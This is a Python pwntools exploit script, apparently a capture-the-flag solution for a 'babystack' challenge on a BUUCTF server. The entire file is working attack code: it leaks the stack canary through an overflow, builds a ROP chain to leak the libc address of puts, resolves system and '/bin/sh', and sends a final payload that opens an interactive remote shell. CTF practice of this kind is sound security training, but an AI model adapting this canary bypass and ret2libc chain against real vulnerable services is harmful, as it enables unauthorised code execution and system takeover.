from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 28677)
elf = ELF('../babystack')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400a93
main = 0x400908

# Leak canary
payload = b'a' * 0x84 + b'mark'
target.sendlineafter('>> ', '1')
target.sendline(payload)
target.sendlineafter('>> ', '2')
target.recvuntil('mark\n')

canary = u64(target.recv(7).rjust(8, b'\x00'))
print(hex(canary))

args = {pop_rdi: [puts_got]};
payload = utils.create_rop_payload(
  0x88, args, 'amd64', puts_plt, canary=canary, fake_return_addrress=main)
target.sendlineafter('>> ', '1')
target.sendline(payload)
target.sendlineafter('>> ', '3')

puts_addr = u64(target.recv(6).ljust(8, b'\x00'))
ans = utils.get_shell_from_libc('puts', puts_addr)
system = ans[0]
shell = ans[1]

args = {pop_rdi: [shell]}
payload = utils.create_rop_payload(0x88, args, 'amd64', system, canary=canary)
target.sendlineafter('>> ', '1')
target.sendline(payload)
target.sendlineafter('>> ', '3')
target.interactive()